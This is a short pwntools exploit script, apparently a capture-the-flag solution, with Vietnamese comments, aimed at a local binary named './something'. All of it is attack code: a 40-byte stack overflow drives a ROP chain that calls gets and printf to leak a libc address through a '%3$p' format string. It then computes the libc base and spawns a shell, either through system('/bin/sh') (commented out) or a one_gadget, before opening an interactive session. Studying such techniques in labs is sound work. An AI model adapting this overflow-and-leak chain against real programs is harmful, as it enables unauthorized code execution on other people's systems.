from pwn import *

r = process("./something")
gdb.attach(r, api=True)

print(r.recvuntil(b"thing : "))

gets = 0x401090
printf = 0x401080
pop_rdi_ret = 0x00000000004012a3
fmt_string = 0x00404500
vuln = 0x00000000004011dd
stdin_offset = 0x00000000001ec980
ret_gadget = 0x000000000040101a
system_offset = 0x00000000000522c0
binsh_offset = 0x1b45bd

# leak dia chi bang formatstring
# dung gets de nhap chuoi formatstring %p leak gia tri cua cac thanh ghi
payload = b"A"*40 + p64(ret_gadget) + p64(pop_rdi_ret) + p64(fmt_string) + p64(gets)
# in ra dia chi leak
payload += p64(ret_gadget) + p64(pop_rdi_ret) + p64(fmt_string) + p64(printf)
# dia chi lenh lap lai ham vuln de tranh loi
payload += p64(ret_gadget) + p64(vuln)
r.sendline(payload)

# nhap formatstring
payload = b"%3$p"
r.sendline(payload)

# tinh dia chi base cua libc
output = r.recvuntil(b"something : ")
stdin = int(output.split(b"Say")[0], 16)
print(hex(stdin))
libc_base = stdin - stdin_offset
print(hex(libc_base))

# goi ham system lay shell (cach 1)
# system = libc_base + system_offset
# binsh = libc_base + binsh_offset
# payload = b"A"*40 + p64(ret_gadget) + p64(pop_rdi_ret) + p64(binsh) + p64(system)
# r.sendline(payload)

# dung one_gadget (cach 2)
onegadget_offset = 0xe3b31
onegadget = libc_base + onegadget_offset
payload = b"A"*40 + p64(ret_gadget) + p64(onegadget)
r.sendline(payload)

r.interactive()